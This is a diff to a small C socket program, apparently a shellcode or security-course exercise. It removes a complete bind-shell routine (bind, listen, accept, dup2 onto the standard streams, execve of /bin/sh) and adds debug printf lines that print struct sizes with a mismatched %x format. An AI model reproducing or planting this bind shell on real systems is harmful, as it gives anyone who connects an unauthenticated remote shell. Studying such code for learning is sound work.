@@ -16,21 +16,7 @@ int main(int argc, char **argv)
   config.sin_family = AF_INET;
   config.sin_addr.s_addr = INADDR_ANY;
   config.sin_port = htons(PORT);
+  printf("The size of a sockaddr_in is: %x\n",sizeof(config));
+  printf("The size of a sockaddr * is: %x\n", sizeof((struct sockaddr *)&config));
   
-  // Bind the created socket with the interface
-  // specified in the configuration
-  bind(lsock, (struct sockaddr *)&config, sizeof(config));
-
-  // Listen on the socket
-  listen(lsock, 0);
-
-  // Accept the incoming connection
-  int csock = accept(lsock, NULL, NULL);
-  // Redirect stdin, stdout, and stderror
-  dup2(csock, 0);
-  dup2(csock, 1);
-  dup2(csock, 2);
-
-  // Execute a shell
-  execve("/bin/sh", NULL, NULL);
-}
+};
